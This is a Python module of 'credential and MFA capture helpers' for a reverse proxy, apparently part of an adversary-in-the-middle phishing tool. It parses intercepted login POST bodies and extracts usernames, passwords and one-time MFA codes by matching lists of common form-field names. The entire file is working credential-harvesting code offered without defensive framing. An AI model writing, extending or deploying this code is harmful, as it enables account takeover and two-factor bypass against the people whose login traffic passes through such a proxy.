"""Credential and MFA capture helpers for the reverse proxy."""

import json
import logging
from urllib.parse import parse_qs

logger = logging.getLogger(__name__)

DEFAULT_PASSWORD_FIELDS = [
    "password", "passwd", "pwd", "pass", "user_password", "login_password",
    "current_password", "new_password", "user[password]", "user[pass]",
]

DEFAULT_MFA_FIELDS = [
    "code", "token", "otp", "mfa", "2fa", "totp", "verification_code",
    "security_code", "auth_code", "challenge",
]

DEFAULT_USERNAME_FIELDS = [
    "username", "user", "email", "login", "login_id", "user_id",
    "user[email]", "user[login]", "user[username]",
]


def _flatten_form_values(parsed: dict) -> dict:
    """Turn parse_qs lists into single values when only one value exists."""
    flat = {}
    for key, values in parsed.items():
        flat[key] = values[0] if len(values) == 1 else values
    return flat


def parse_post_body(body: bytes, content_type: str | None = None) -> dict:
    """Parse a POST body into a flat dict of field names to values."""
    if not body:
        return {}

    text = body.decode("utf-8", errors="replace")
    ct = (content_type or "").lower()

    try:
        if "application/json" in ct:
            data = json.loads(text)
            if isinstance(data, dict):
                return data
            return {}
        if "application/x-www-form-urlencoded" in ct or "multipart/form-data" in ct:
            return _flatten_form_values(parse_qs(text, keep_blank_values=True))
    except Exception:
        logger.exception("Failed to parse POST body for credential capture")

    # Fallback: try form-urlencoded parsing for any POST body.
    try:
        return _flatten_form_values(parse_qs(text, keep_blank_values=True))
    except Exception:
        return {}


def _matches(name: str, candidates: list[str]) -> bool:
    lowered = name.lower()
    for c in candidates:
        if lowered == c or lowered.endswith("[" + c + "]") or lowered.endswith("_" + c):
            return True
    return False


def find_username(fields: dict) -> str | None:
    for name, value in fields.items():
        if _matches(name, DEFAULT_USERNAME_FIELDS) and value:
            return value if isinstance(value, str) else str(value)
    return None


def extract_credentials(fields: dict, password_fields: list[str] | None = None,
                        mfa_fields: list[str] | None = None) -> list[dict]:
    """Return a list of captured credential dicts from parsed form fields."""
    password_fields = password_fields or DEFAULT_PASSWORD_FIELDS
    mfa_fields = mfa_fields or DEFAULT_MFA_FIELDS
    found = []

    for name, value in fields.items():
        if not value or not isinstance(value, (str, int)):
            continue
        str_value = str(value)
        if _matches(name, password_fields):
            found.append({"type": "password", "field": name, "value": str_value})
        elif _matches(name, mfa_fields):
            found.append({"type": "mfa", "field": name, "value": str_value})

    return found
